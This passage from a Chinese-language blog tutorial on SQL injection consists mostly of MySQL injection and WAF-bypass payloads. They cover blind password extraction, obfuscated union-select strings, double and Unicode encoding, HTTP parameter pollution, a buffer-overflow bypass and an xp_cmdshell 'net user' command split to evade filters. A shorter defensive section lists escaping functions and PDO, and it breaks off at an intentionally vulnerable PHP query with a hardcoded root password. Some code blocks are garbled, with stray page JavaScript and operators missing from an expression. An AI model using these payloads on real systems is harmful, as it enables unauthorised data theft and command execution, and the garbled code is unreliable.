<p>having和where的区别：<br>作用的对象不同。WHERE 子句作用于表和视图，HAVING 子句作用于组。<br>WHERE 在分组和聚集计算之前选取输入行（因此，它控制哪些行进入聚集计算）， 而 HAVING 在分组和聚集之后选取分组的行。因此，WHERE 子句不能包含聚集函数； 因为试图用聚集函数判断那些行输入给聚集运算是没有意义的。 相反，HAVING 子句总是包含聚集函数。（严格说来，你可以写不使用聚集的 HAVING 子句， 但这样做只是白费劲。同样的条件可以更有效地用于 WHERE 阶段。）<br>对比一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT ip,ip1,ip2,ip3,ip4,count(*) ct,mobile_info FROM `lmaster_log` </span><br><span class="line">        GROUP BY ip1,ip2,ip3 ORDER BY ip1,ip2,ip3,ip4 HAVING ct &gt; 2;</span><br><span class="line">SELECT ip,ip1,ip2,ip3,ip4,count(*) ct,mobile_info FROM `lmaster_log` </span><br><span class="line">        GROUP BY ip1,ip2,ip3 HAVING ct &gt; 2 ORDER BY ip1,ip2,ip3,ip4;</span><br></pre></td></tr></table></figure></p>
<h4 id="9-过滤substr、substring"><a href="#9-过滤substr、substring" class="headerlink" title="9.过滤substr、substring"></a>9.过滤substr、substring</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　 </span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">substr((select &apos;password&apos;),1,1) = 0x70 </span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x69) = 1 </span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x70) = 0 </span><br><span class="line">strcmp(left(&apos;password&apos;,1), 0x71) = -1</span><br></pre></td></tr></table></figure>
<h4 id="10-类型转换"><a href="#10-类型转换" class="headerlink" title="10.类型转换"></a>10.类型转换</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&apos; or 1=true #true=1, false=0</span><br><span class="line">&apos; or 1 #true</span><br><span class="line">&apos; or version()=5.5 #5.5.41-log</span><br><span class="line"></span><br><span class="line">&apos; or round(pi(),1)+true+true+0.4=version() #3.1+1+1+0.4</span><br><span class="line"></span><br><span class="line">select * from users where &apos;a&apos;=&apos;b&apos;=&apos;c&apos;</span><br><span class="line">select * from users where (&apos;a&apos;=&apos;b&apos;)=&apos;c&apos;</span><br><span class="line">select * from users where (false)=&apos;c&apos;</span><br><span class="line">select * from users where (0)=&apos;c&apos;</span><br><span class="line">select * from users where (0)=0</span><br><span class="line">select * from users where true</span><br><span class="line">select * from users</span><br></pre></td></tr></table></figure>
<p>效果相同</p>
<h3 id="0x14-对waf的深入研究与绕过"><a href="#0x14-对waf的深入研究与绕过" class="headerlink" title="0x14 对waf的深入研究与绕过"></a>0x14 对waf的深入研究与绕过</h3><hr>
<h4 id="1-关键字过滤"><a href="#1-关键字过滤" class="headerlink" title="1.关键字过滤"></a>1.关键字过滤</h4><p>空格</p>
<p>过滤代码<code>/\s/</code><br>不再赘述</p>
<p>过滤代码<code>/\sor\s/i,/\sand\s/i</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos;||1=&apos;1     #or</span><br><span class="line">&apos;=&apos;</span><br><span class="line">&apos;&amp;&amp;1=&apos;1     #and</span><br></pre></td></tr></table></figure></p>
<p>过滤代码<code>/union\s+select/i</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&apos;and(true)like(false)union(select(pass)from(users))#</span><br><span class="line">&apos;union [all|distinct] select pass from users#</span><br><span class="line">&apos;union%a0select pass from users#</span><br><span class="line">&apos;union/*!select*/pass from users#</span><br><span class="line">/vuln.php?id=1 union/*&amp;sort=*/select pass from users-- -</span><br></pre></td></tr></table></figure></p>
<p>如果单独过滤union,使用盲注来获取数据<br><code>&#39;and(select pass from users limit 1)=&#39;secret</code></p>
<h3 id="0x15-一些函数"><a href="#0x15-一些函数" class="headerlink" title="0x15 一些函数"></a>0x15 一些函数</h3><hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lpad(data,1,space(1)) // lpad(&apos;hi&apos;,4,&apos;?&apos;) = &apos;??hi&apos;</span><br><span class="line">rpad(data,1,space(1)) // rpad(&apos;hi&apos;,4,&apos;?&apos;) = &apos;hi??&apos;</span><br><span class="line">left(data,1)</span><br><span class="line">reverse(right(reverse(data),1))</span><br><span class="line">insert(insert(version(),1,0,space(0)),2,222,space(0))</span><br></pre></td></tr></table></figure>
<h4 id="1-有些函数有类似搜索匹配的功能"><a href="#1-有些函数有类似搜索匹配的功能" class="headerlink" title="1.有些函数有类似搜索匹配的功能"></a>1.有些函数有类似搜索匹配的功能</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;-if(locate(&apos;f&apos;,data),1,0)#</span><br><span class="line">&apos;-if(locate(&apos;fo&apos;,data),1,0)#</span><br><span class="line">&apos;-if(locate(&apos;foo&apos;,data),1,0)#</span><br><span class="line">instr(), position()</span><br></pre></td></tr></table></figure>
<h4 id="2-使用函数进行字符串的切割"><a href="#2-使用函数进行字符串的切割" class="headerlink" title="2.使用函数进行字符串的切割"></a>2.使用函数进行字符串的切割</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">length(trim(leading &apos;a&apos; FROM data)) # length will be shorter</span><br><span class="line">length(replace(data, &apos;a&apos;, &apos;&apos;)) # length will be shorter</span><br><span class="line">2种方式都是相同效果</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1个控制流程操作(select, case, if(), ...)</span><br><span class="line">1个比较操作(=, like, mod(), ...)</span><br><span class="line">1个字符串的猜解(mid(), left(), rpad(), …)</span><br><span class="line">1个字符串生成(0x61, hex(), conv())</span><br></pre></td></tr></table></figure>
<p><strong>使用conv([10-36],10,36)可以实现所有字符的表示</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">false !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K</span><br><span class="line">true !!pi()           1     ceil(pi()*pi())+true      11 B      ceil(ceil(pi())*version()) 21   L</span><br><span class="line">true+true             2     ceil(pi()+pi()+version()) 12 C      ceil(pi()*ceil(pi()+pi())) 22   M</span><br><span class="line">floor(pi())           3     floor(pi()*pi()+pi())     13 D      ceil((pi()+ceil(pi()))*pi()) 23 N</span><br><span class="line">ceil(pi())            4     ceil(pi()*pi()+pi())      14 E      ceil(pi())*ceil(version()) 24   O</span><br><span class="line">floor(version())      5     ceil(pi()*pi()+version()) 15 F      floor(pi()*(version()+pi())) 25 P</span><br><span class="line">ceil(version())       6     floor(pi()*version())     16 G      floor(version()*version()) 26   Q</span><br><span class="line">ceil(pi()+pi())       7     ceil(pi()*version())      17 H      ceil(version()*version()) 27    R</span><br><span class="line">floor(version()+pi()) 8     ceil(pi()*version())+true 18 I      ceil(pi()*pi()*pi()-pi()) 28    S</span><br><span class="line">floor(pi()*pi())      9     floor((pi()+pi())*pi())   19 J      floor(pi()*pi()*floor(pi())) 29 T</span><br></pre></td></tr></table></figure></p>
<h3 id="0x16-从初级到高级的9类WAF绕过技巧"><a href="#0x16-从初级到高级的9类WAF绕过技巧" class="headerlink" title="0x16 从初级到高级的9类WAF绕过技巧"></a>0x16 从初级到高级的9类WAF绕过技巧</h3><hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1)大小写混合 </span><br><span class="line">2)替换关键字 </span><br><span class="line">3)使用编码 </span><br><span class="line">4)使用注释 </span><br><span class="line">5)等价函数与命令 </span><br><span class="line">6)使用特殊符号 </span><br><span class="line">7)HTTP参数控制 </span><br><span class="line">8)缓冲区溢出 </span><br><span class="line">9)整合绕过</span><br></pre></td></tr></table></figure>
<h4 id="1-大小写绕过"><a href="#1-大小写绕过" class="headerlink" title="1.大小写绕过"></a>1.大小写绕过</h4><p>只针对小写或大写的关键字匹配技术正则表达式<code>/express/i</code>匹配时大小写不敏感便无法绕过这是最简单的绕过技术<br><code>z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</code></p>
<h4 id="2-关键字替换"><a href="#2-关键字替换" class="headerlink" title="2.关键字替换"></a>2.关键字替换</h4><p>双写</p>
<h4 id="3-使用编码"><a href="#3-使用编码" class="headerlink" title="3.使用编码"></a>3.使用编码</h4><h5 id="1-URL编码"><a href="#1-URL编码" class="headerlink" title="1.URL编码"></a>1.URL编码</h5><p>在Chrome中输入一个链接非保留字的字符浏览器会对其URL编码如空格变为%20、单引号%27、左括号%28、右括号%29</p>
<p>普通的URL编码可能无法实现绕过不过存在某种情况URL编码只进行了一次解码过滤可以用两次编码绕过</p>
<p><code>page.php?id=1%252f%252a*/UNION%252f%252a/SELECT</code> </p>
<h5 id="2-十六进制编码"><a href="#2-十六进制编码" class="headerlink" title="2.十六进制编码"></a>2.十六进制编码</h5><p><code>z.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4,SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</code><br>示例代码中前者是对单个字符十六进制编码后者则是对整个字符串编码对整个字符串编码相对来说较少见一点</p>
<h5 id="3-Unicode编码"><a href="#3-Unicode编码" class="headerlink" title="3.Unicode编码"></a>3.Unicode编码</h5><p>Unicode有所谓的标准编码和非标准编码假设我们用的utf-8为标准编码那么西欧语系所使用的就是非标准编码了</p>
<p>看一下常用的几个符号的一些Unicode编码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</span><br><span class="line"></span><br><span class="line">空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</span><br><span class="line"></span><br><span class="line">左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</span><br><span class="line"></span><br><span class="line">右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</span><br></pre></td></tr></table></figure></p>
<p>举例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=10%D6&apos;%20AND%201=2%23　　</span><br><span class="line"></span><br><span class="line">SELECT &apos;Ä&apos;=&apos;A&apos;; #1</span><br></pre></td></tr></table></figure></p>
<p>两个示例中，前者利用双字节绕过，比如对单引号转义操作变成\’，那么就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用。</p>
<p>第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过。</p>
<p>另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下。</p>
<p>常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的例子。</p>
<h5 id="4-使用注释"><a href="#4-使用注释" class="headerlink" title="4.使用注释"></a>4.使用注释</h5><h6 id="1-看一下常见的用于注释的符号有哪些"><a href="#1-看一下常见的用于注释的符号有哪些" class="headerlink" title="1.看一下常见的用于注释的符号有哪些"></a>1.看一下常见的用于注释的符号有哪些</h6><p><code>//, -- , /**/, #, --+,--  -, ;--a</code></p>
<h6 id="2-内联注释"><a href="#2-内联注释" class="headerlink" title="2.内联注释"></a>2.内联注释</h6><p>相比普通注释内联注释用的更多/!content/只有MySQL会正常识别content的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3 </span><br><span class="line">?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…</span><br></pre></td></tr></table></figure>
<h4 id="5-等价函数"><a href="#5-等价函数" class="headerlink" title="5.等价函数"></a>5.等价函数</h4><p>1.函数与变量<br>不再赘述<br>2.符号<br>不再赘述<br>3.生僻函数<br>和上文中其他非常规方法进行注入所用函数一样，故不再赘述</p>
<h4 id="6-特殊符号"><a href="#6-特殊符号" class="headerlink" title="6.特殊符号"></a>6.特殊符号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.使用反引号`，例如select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</span><br><span class="line">2.神奇的&quot;-+.&quot;，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤</span><br><span class="line">3.@符号，select@^1.from users; @用于变量定义如@var/* &lt;![CDATA[ */!function(t,e,r,n,c,a,p)&#123;try&#123;t=document.currentScript||function()&#123;for(t=document.getElementsByTagName(&apos;script&apos;),e=t.length;e--;)if(t[e].getAttribute(&apos;data-cfhash&apos;))return t[e]&#125;();if(t&amp;&amp;(c=t.previousSibling))&#123;p=t.parentNode;if(a=c.getAttribute(&apos;data-cfemail&apos;))&#123;for(e=&apos;&apos;,r=&apos;0x&apos;+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+=&apos;%&apos;+(&apos;0&apos;+(&apos;0x&apos;+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)&#125;p.removeChild(t)&#125;&#125;catch(u)&#123;&#125;&#125;()/* ]]&gt; */_name，一个@表示用户定义，@@表示系统变量</span><br><span class="line">4.Mysql function() as xxx  也可不用as和空格　　 select-count(id)test from users;  //绕过空格限制</span><br></pre></td></tr></table></figure>
<p>特殊符号灵活运用，威力无穷<br>一些栗子:<br>`、~、!、@、%、()、[]、.、-、+ 、|、%00</p>
<h4 id="7-关键字拆分"><a href="#7-关键字拆分" class="headerlink" title="7.关键字拆分"></a>7.关键字拆分</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&apos;se&apos;+&apos;lec&apos;+&apos;t&apos;</span><br><span class="line">%S%E%L%E%C%T 1</span><br><span class="line">1.aspx?id=1;EXEC(&apos;ma&apos;+&apos;ster..x&apos;+&apos;p_cm&apos;+&apos;dsh&apos;+&apos;ell &quot;net user&quot;&apos;)!</span><br><span class="line">和()&apos; or --+2=- -!!!&apos;2id=1+(UnI)(oN)+(SeL)(EcT)//有看到说Access中,”[]”用于表和列,”()”用于数值也可以做分隔</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本节最后再给出一些和这些字符多少有点关系的操作符供参考</span><br></pre></td></tr></table></figure>
<blockquote>
<p>,&lt;&lt;, &gt;=, &lt;=, &lt;&gt;,&lt;=&gt;,&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN<br>使用这些”特殊符号”实现绕过是一件很细微的事情一方面各数据库对符号的处理是不尽相同的另一方面你得充分了解这些符号的特性和使用方法才能会考虑利用其实现绕过</p>
</blockquote>
<h4 id="8-HTTP参数控制"><a href="#8-HTTP参数控制" class="headerlink" title="8.HTTP参数控制"></a>8.HTTP参数控制</h4><h5 id="1-HPP参数污染-HTTP-Parameter-Polution"><a href="#1-HPP参数污染-HTTP-Parameter-Polution" class="headerlink" title="1.HPP参数污染(HTTP Parameter Polution)"></a>1.HPP参数污染(HTTP Parameter Polution)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=1;</span><br><span class="line">select+1&amp;id=2,3+from+users+where+id=1—/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users</span><br></pre></td></tr></table></figure>
<p><img src="/SQL injection/3.jpg" alt="injection"></p>
<p>不再赘述</p>
<h5 id="2-HPF-HTTP-Parameter-Fragment"><a href="#2-HPF-HTTP-Parameter-Fragment" class="headerlink" title="2.HPF(HTTP Parameter Fragment)"></a>2.HPF(HTTP Parameter Fragment)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?a=1+union/&amp;b=/select+1,pass/&amp;c=/from+users--</span><br><span class="line"></span><br><span class="line">select * from table where a=1 union/* and b=/select 1,pass/ limit */from users—</span><br></pre></td></tr></table></figure>
<p>看完上面两个示例发现和HPP最后一个示例很像不同之处在于参数不一样这里是在不同的参数之间进行分割结果到了数据库执行查询时再合并语句。</p>
<h5 id="3-HPC-HTTP-Parameter-Contamination"><a href="#3-HPC-HTTP-Parameter-Contamination" class="headerlink" title="3.HPC(HTTP Parameter Contamination)"></a>3.HPC(HTTP Parameter Contamination)</h5><p>RFC2396定义了如下一些字符</p>
<p>Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ‘ ()<br>Reserved : ; / ? : @ &amp; = + $ ,<br>Unwise : { } | \ ^ [ ] `<br>不同的Web服务器处理处理构造得特殊请求时有不同的逻辑</p>
<h4 id="9-缓冲区溢出"><a href="#9-缓冲区溢出" class="headerlink" title="9.缓冲区溢出"></a>9.缓冲区溢出</h4><p>缓冲区溢出用于对付WAF在内的软件，其本身有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制。因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过</p>
<p><img src="/SQL injection/4.jpg" alt="injection"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">栗子</span><br><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br></pre></td></tr></table></figure>
<p>示例0xA*1000指0xA后面”A”重复1000次一般来说对应用软件构成缓冲区溢出都需要较大的测试长度这里1000只做参考也许在有些情况下可能不需要这么长也能溢出<br>意为重复1000次绕过WAF从而使得后面的查询语句不会被过滤而得到执行</p>
<h4 id="10-整合绕过"><a href="#10-整合绕过" class="headerlink" title="10.整合绕过"></a>10.整合绕过</h4><p>结合使用前面谈到的各种绕过技术单一的技术可能无法绕过过滤机制但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说关系到总体与局部和另一方面则是多种技术的使用创造了更多的可能性组合除非每一种技术单独都无法使用否则它们能产生比自身大得多的能量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">栗子:</span><br><span class="line">z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -</span><br><span class="line">?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--</span><br></pre></td></tr></table></figure>
<p>即<strong>利用数据库中预定义的数字变量进行bypass</strong><br><img src="/SQL injection/5.jpg" alt="injection"><br><img src="/SQL injection/6.jpg" alt="injection"><br>上面两张图第一张是不能使用数字时通过使用数学函数得到某个数字的值第二张则是这些数字对应的36进制的值因此有时候一个很简单的表达式可能会很复杂或者非常长其实际就是计算mod(a,b)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(mod(length(trim(leading(concat(lower(conv(version()(true+pi()),pi()pi(),pow(pi(),pi()))),lower(conv(pi()pi()pi()-pi()-pi(),pi()pi(), pow(pi(),pi()))),lower(conv(pi()version(),pi()pi(),pow(pi(),pi()))),conv(version()(true+pi()),pi()pi(),pow(pi(),pi())),lower(conv(pi()pi()pi()-pi()-pi(),pi()pi(),pow(pi(),pi()))),lower(conv(pi()version(),pi()pi(),pow(pi(),pi()))),lower(conv(ceil(pi()version())+true,pi()pi(),pow(pi(), pi()))),lower(conv(ceil((pi()+ceil(pi()))pi()),pi()pi(),pow(pi(),pi()))),lower(conv(ceil(pi())ceil(pi()+pi()),pi()pi(),pow(pi(),pi()))),conv(ceil(pi()version()),pi()pi(),pow(pi(),pi())),lower(conv(ceil(pi()pi()+pi()),pi()pi(),pow(pi(),pi()))),lower(conv(ceil(version()version()),pi()pi(),pow(pi(),pi()))),lower(conv(ceil(pi()pi()+pi()),pi()pi(),pow(pi(),pi())))))from(pass))),length(pass))</span><br></pre></td></tr></table></figure>
<p><strong>SELECT 用法大全</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SELECT</span><br><span class="line">[ALL | DISTINCT | DISTINCTROW ]</span><br><span class="line">[HIGH_PRIORITY]</span><br><span class="line">[STRAIGHT_JOIN]</span><br><span class="line">[SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]</span><br><span class="line">[SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]</span><br><span class="line">select_expr [, select_expr ...]</span><br><span class="line">[FROM table_references</span><br><span class="line">[PARTITION partition_list]</span><br><span class="line">[WHERE where_condition]</span><br><span class="line">[GROUP BY &#123;col_name | expr | position&#125;</span><br><span class="line">[ASC | DESC], ... [WITH ROLLUP]]</span><br><span class="line">[HAVING where_condition]</span><br><span class="line">[ORDER BY &#123;col_name | expr | position&#125;</span><br><span class="line">[ASC | DESC], ...]</span><br><span class="line">[LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;]</span><br><span class="line">[PROCEDURE procedure_name(argument_list)]</span><br><span class="line">[INTO OUTFILE &apos;file_name&apos;</span><br><span class="line">[CHARACTER SET charset_name]</span><br><span class="line">export_options</span><br><span class="line">| INTO DUMPFILE &apos;file_name&apos;</span><br><span class="line">| INTO var_name [, var_name]]</span><br><span class="line">[FOR UPDATE | LOCK IN SHARE MODE]]</span><br></pre></td></tr></table></figure>
<h3 id="0x16-防御方法"><a href="#0x16-防御方法" class="headerlink" title="0x16 防御方法"></a>0x16 防御方法</h3><hr>
<h4 id="1-传统方法"><a href="#1-传统方法" class="headerlink" title="1.传统方法"></a>1.传统方法</h4><p>一些黑名单函数(mysql_real_escape_string、addslashes)，正则表达式，PHP Filter函数<br>(1). mysql_real_escape_string()<br>这个函数在PHP中防止SQL注入攻击时非常有用。这个函数会对一些例如单引号、双引号、反斜杠等特殊字符添加一个反斜杠以确保在查询这些数据之前，用户提供的输入是干净的。但要注意，你是在连接数据库的前提下使用这个函数。</p>
<p>但是现在已经不推荐使用mysql_real_escape_string()了，所有新的应用应该使用像PDO一样的函数库执行数据库操作，也就是说，我们可以使用现成的语句防止SQL注入攻击。</p>
<p>(2). addslashes()<br>这个函数的原理跟mysql_real_escape_string()相似。但是当在php.ini文件中，“magic_quotes_gpc“的值是“on”的时候，就不要使用这个函数。magic_quotes_gpc 的默认值是on，对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。不要对已经被 magic_quotes_gpc 转义过的字符串使用 addslashes()，因为这样会导致双层转义。你可以使用get_magic_quotes_gpc()函数来确定它是否开启。</p>
<p>(3). htmlentities()<br>这个函数对于过滤用户输入的数据非常有用。它会将一些特殊字符转换为HTML实体。例如，用户输入&lt;时，就会被该函数转化为HTML实体&lt;（&amp;lt），输入&gt;就被转为实体&amp;gt.(HTML实体对照表：<a href="http://www.w3school.com.cn/html/html_entities.asp)，可以防止XSS和SQL注入攻击。" target="_blank" rel="noopener">http://www.w3school.com.cn/html/html_entities.asp)，可以防止XSS和SQL注入攻击。</a></p>
<p>(4). htmlspecialchars()<br>在HTML中，一些特定字符有特殊的含义，如果要保持字符原来的含义，就应该转换为HTML实体。这个函数会返回转换后的字符串，例如‘&amp;’ (ampersand) 转为’&amp;amp‘（ps:请参照第三点中的实体对照表链接）</p>
<p>附上此函数常见的转换字符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">The translations performed are:</span><br><span class="line"></span><br><span class="line">‘&amp;’ (ampersand) becomes ‘’</span><br><span class="line"></span><br><span class="line">‘”‘ (double quote) becomes ‘’ when ENT_NOQUOTES is not set.</span><br><span class="line"></span><br><span class="line">“‘” (single quote) becomes ‘&amp;#039;’ (or ) only when ENT_QUOTES is set.</span><br><span class="line"></span><br><span class="line">‘&lt;’ (less than) becomes ‘’</span><br><span class="line"></span><br><span class="line">‘&gt;’ (greater than) becomes ‘’</span><br></pre></td></tr></table></figure>
<p>(5). strip_tags()<br>这个函数可以去除字符串中所有的HTML，JavaScript和PHP标签，当然你也可以通过设置该函数的第二个参数，让一些特定的标签出现。</p>
<p>(6). md5()<br>从安全的角度来说，一些开发者在数据库中存储简单的密码的行为并不值得推荐。md5()函数可以产生给定字符串的32个字符的md5散列，而且这个过程不可逆，即你不能从md5()的结果得到原始字符串。</p>
<p>现在这个函数并不被认为是安全的，因为开源的数据库可以反向检查一个散列值的明文。你可以在这里找到一个MD5散列数据库列表</p>
<p>(7). sha1()<br>这个函数与md5()类似，但是它使用了不同的算法来产生40个字符的SHA-1散列（md5产生的是32个字符的散列）。也不要把绝对安全寄托在这个函数上，否则会有意想不到的结果。</p>
<p>(8). intval()<br>intval()函数是将变量转成整数类型，你可以用这个函数让你的PHP代码更安全，特别是当你在解析id，年龄这样的数据时。</p>
<p>(9).在表单中通过js绑定数据类型、或者过滤一些非法字符 </p>
<h4 id="2-流行方法"><a href="#2-流行方法" class="headerlink" title="2.流行方法"></a>2.流行方法</h4><p>一些API:<br>(1).预编译<br>(2).PDO<br>PHP数据对象(PHP Data Object)的缩写<br>脚本样例:</p>
<p>首先是普通方式连接数据库:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn = mysql_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"gjl990703"</span>);</span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">mysql_select_db(<span class="string">"sqlin"</span>,$conn);</span><br><span class="line">$sql = <span class="string">"select * from dvwa where id = '$id'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span 